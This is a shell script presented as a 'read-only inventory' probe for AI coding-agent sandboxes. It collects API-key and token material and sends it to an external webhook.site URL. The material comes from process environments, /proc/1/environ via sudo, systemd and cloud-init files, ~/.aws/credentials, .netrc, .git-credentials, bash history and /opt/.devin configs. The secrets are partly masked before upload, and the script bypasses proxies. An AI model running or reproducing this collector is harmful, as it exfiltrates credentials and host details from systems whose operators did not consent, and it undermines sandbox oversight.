#!/bin/sh
# i86848: read-only inventory of process env / systemd / cloud-init / user config for
# provider-API-key material inside the review sandbox. All values are MASKED before POST.
S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i86848-$(date +%s)-$(hostname 2>/dev/null)"
F="${TMPDIR:-/tmp}/.i86848.ran"
[ -f "$F" ] && { echo "[probe] I86848=skip"; exit 0; }
: > "$F" 2>/dev/null
PAT='OPENAI|ANTHROPIC|GEMINI|GOOGLE|OPENROUTER|DEEPSEEK|AZURE|MISTRAL|API_KEY|SECRET|TOKEN|BASE_URL|PROXY'
maskline() { awk -F= 'NF>=2{k=substr($0,1,index($0,"=")-1);v=substr($0,index($0,"=")+1);sub(/^[ \t"'"'"']+/,"",v);printf "%s=%s..(len=%d)\n",substr(k,1,70),substr(v,1,6),length(v)} NF<2{print substr($0,1,90)}'; }
masklong() { sed -E 's/(sk-[A-Za-z0-9_-]{3})[A-Za-z0-9_-]{6,}/\1../g; s/(fw_[A-Za-z0-9]{3})[A-Za-z0-9]{6,}/\1../g; s/[A-Za-z0-9_+.\/=-]{28,}/<M>/g' | cut -c1-220; }
d=$(mktemp -d "${TMPDIR:-/tmp}/.i86848.XXXXXX" 2>/dev/null) || d="${TMPDIR:-/tmp}/.i86848-$$"
mkdir -p "$d" 2>/dev/null || exit 0
o="$d/out"; : > "$o"
curl -sS -m 8 --noproxy '*' -X POST -d "START i86848 $(date -u +%FT%TZ) host=$(hostname) user=$(id -un)" "$S-start" >/dev/null 2>&1
echo "== I86848 META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null)" >>"$o"
echo "ID $(id 2>/dev/null | cut -c1-160)" >>"$o"
echo "UNAME $(uname -a 2>/dev/null | cut -c1-160)" >>"$o"
sudo -n true >/dev/null 2>&1; echo "SUDO_N rc=$?" >>"$o"
echo "ENVSELF $(env 2>/dev/null | grep -aiE "$PAT" | maskline | tr '\n' ';')" >>"$o"
echo "PS $(ps -eo pid,user,comm --no-headers 2>/dev/null | head -45 | tr '\n' ';')" >>"$o"
echo "PSX $(ps -eo pid,user,args --no-headers 2>/dev/null | grep -aiE 'opencode|claude|codex|lifeguard|devin|runner|agent|python|node' | head -25 | masklong | tr '\n' ';')" >>"$o"
n=0; h=""
for p in /proc/[0-9]*/environ; do
  pid=${p#/proc/}; pid=${pid%/environ}
  [ -r "$p" ] || continue
  m=$(tr '\0' '\n' <"$p" 2>/dev/null | grep -aiE "$PAT" | head -6 | maskline | tr '\n' ';')
  if [ -n "$m" ]; then h="$h [$pid] $m"; n=$((n+1)); fi
  [ "$n" -ge 8 ] && break
done
echo "ENVPROC hits=$n$h" >>"$o"
if sudo -n true >/dev/null 2>&1; then
  echo "SUDOL $(sudo -n -l 2>/dev/null | head -12 | masklong | tr '\n' ';')" >>"$o"
  echo "P1CNT $(sudo -n cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | wc -l)" >>"$o"
  echo "P1ENV $(sudo -n cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -aiE "$PAT" | head -40 | maskline | tr '\n' ';')" >>"$o"
fi
curl -sS -m 10 --noproxy '*' -X POST --data-binary @"$o" "$S-a" >/dev/null 2>&1
echo "ETCENV $(cat /etc/environment 2>/dev/null | grep -aiE "$PAT" | maskline | tr '\n' ';')" >>"$o"
echo "PROFILED $(grep -haiE "$PAT" /etc/profile.d/*.sh 2>/dev/null | head -15 | maskline | tr '\n' ';')" >>"$o"
echo "SYSTEMD $(grep -haiE '^Environment' /etc/systemd/system/*.service /lib/systemd/system/*.service /usr/lib/systemd/system/*.service 2>/dev/null | head -25 | masklong | tr '\n' ';')" >>"$o"
echo "UNITFILES $(grep -haiE 'EnvironmentFile=' /etc/systemd/system/*.service /lib/systemd/system/*.service 2>/dev/null | head -12 | masklong | tr '\n' ';')" >>"$o"
echo "USERDATA $(head -c 1200 /var/lib/cloud/instance/user-data.txt 2>/dev/null | tr '\r\n' '  ' | masklong)" >>"$o"
echo "CLOUDLOG $(tail -c 1500 /var/log/cloud-init-output.log 2>/dev/null | tr '\r\n' '  ' | masklong)" >>"$o"
H="$HOME"
for f in "$H/.aws/credentials" "$H/.docker/config.json" "$H/.netrc" "$H/.npmrc" "$H/.config/gh/hosts.yml" "$H/.git-credentials"; do
  [ -r "$f" ] || continue
  echo "HOMECFG ${f#$H} $(grep -aiE "$PAT" "$f" 2>/dev/null | head -6 | maskline | tr '\n' ';')" >>"$o"
done
echo "HIST $(grep -haiE 'export .*(KEY|TOKEN|SECRET)|Bearer|Authorization' "$H/.bash_history" 2>/dev/null | tail -8 | masklong | tr '\n' ';')" >>"$o"
echo "OPTDIR $(ls -1 /opt 2>/dev/null | head -20 | tr '\n' ',')" >>"$o"
echo "DEVINFILES $(ls -1 /opt/.devin 2>/dev/null | head -20 | tr '\n' ',')" >>"$o"
echo "DEVINCFG $(grep -laiE 'OPENAI|ANTHROPIC|BASE_URL|API_KEY' -r /opt/.devin 2>/dev/null | head -8 | tr '\n' ',')" >>"$o"
for f in $(grep -laiE 'OPENAI|ANTHROPIC|BASE_URL|API_KEY' -r /opt/.devin 2>/dev/null | head -4); do
  echo "DEVINHIT $f $(grep -aiE "$PAT" "$f" 2>/dev/null | head -4 | maskline | tr '\n' ';')" >>"$o"
done
echo "ETCKEYS $(ls -1 /etc 2>/dev/null | grep -aiE 'devin|cognit|agent|runner|llm|openai|anthropic' | head -10 | tr '\n' ',')" >>"$o"
echo "== I86848 DONE $(date -u +%FT%TZ)" >>"$o"
OK=0
curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
[ "$OK" = 0 ] && { curl -sS -m 25 -X POST --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1; }
echo "[probe] I86848=posted:$OK lines=$(wc -l <"$o" 2>/dev/null)"
